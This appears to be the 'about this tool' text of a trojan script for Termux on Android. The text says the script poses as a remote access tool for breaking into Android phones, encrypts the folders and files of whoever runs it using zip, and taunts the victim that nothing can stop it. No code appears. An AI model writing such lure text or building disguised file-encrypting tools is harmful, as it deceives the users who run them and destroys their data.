ABOUT THIS TOOL
  
This tool was carefully and perfectly designed and scripted by PJ alias ByteX  when hacking for script kiddys like you, to disguise  itself as a legit remote access tool   that successfully runs on termux to gain unauthorized access to Android OS. But the script end up performing its main purpose by simply encrypting some folders and its files on your phone just with the help of zip and other packages. And if you are reading this it means game over for you theres nothing you can do to stop it now.
